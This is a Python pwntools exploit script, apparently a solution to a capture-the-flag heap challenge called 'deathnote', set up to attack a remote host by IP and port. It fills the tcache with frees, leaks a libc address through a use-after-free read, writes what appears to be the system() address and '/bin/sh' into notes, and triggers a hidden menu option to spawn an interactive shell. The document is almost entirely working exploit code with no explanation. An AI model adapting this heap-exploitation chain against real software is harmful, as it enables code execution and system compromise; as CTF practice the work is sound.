from pwn import *
from icecream import ic

elf = exe = ELF("./deathnote")
libc = elf.libc
context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("83.136.252.96", 37304)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b _
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def add(size, page, victim):
    ru("💀")
    sl(b'1')
    ru("💀")
    sl(str(size).encode())
    ru("💀")
    sl(str(page).encode())
    ru("💀")
    sl(victim)

def remove(page):
    ru("💀")
    sl(b'2')
    ru("💀")
    sl(str(page).encode())

def show(page):
    ru("💀")
    sl(b'3')
    ru("💀")
    sl(str(page).encode())

def questionmark():
    ru("💀")
    sl(b'42')

# add(b'10', b'1', b'aaa')
# remove(b'1')
# show(b'1')
# ru("Page content:")
# leak = u64(re(6)+b'\x00\x00')
# ic(hex(leak))

for i in range (10):
    add(0x80,i,"0xdeadbeef")

# allocating barrier
add(0x80,9,"BARRIER")

# Filling up tcache + getting some fastbins filled
for i in range (10):
    remove(i)

show(7)
ru("content: ")
libc = u64(rl().strip().ljust(8,b"\x00")) - 0x21ace0
ic(libc)

# show(0)
# ru("content: ")
# heap = (u64(rl().strip().ljust(8,b"\x00"))) << 12
# ic(heap)

add(0x80, 0, hex(libc+0x50d70))
add(0x80, 1, '/bin/sh')
questionmark()

io.interactive()
